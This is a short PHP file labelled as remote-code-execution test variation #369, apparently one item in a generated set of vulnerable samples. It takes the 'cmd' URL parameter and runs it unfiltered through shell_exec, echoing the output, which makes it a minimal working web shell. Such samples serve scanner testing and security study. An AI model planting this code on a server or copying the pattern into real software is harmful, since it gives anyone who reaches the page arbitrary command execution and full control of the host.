<?php
// RCE test variation #369
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>